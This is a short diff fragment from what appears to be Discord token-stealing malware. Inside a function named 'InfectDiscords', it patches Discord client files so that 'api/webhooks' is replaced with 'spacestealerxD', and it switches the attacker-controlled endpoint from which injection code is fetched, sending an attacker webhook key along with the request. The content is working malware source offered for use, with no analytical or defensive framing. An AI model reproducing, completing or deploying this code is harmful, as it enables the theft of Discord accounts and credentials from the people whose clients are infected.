@@ -1110,7 +1110,7 @@ async function InfectDiscords() {
         var read = fs.readFileSync(dir);
         fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
     }
-    const response = await httpx(`${baseapi}/injection2`, {
+    const response = await httpx(`${baseapi}/githubinjectionnn`, {
         data: {
             key: webhook3939
         }
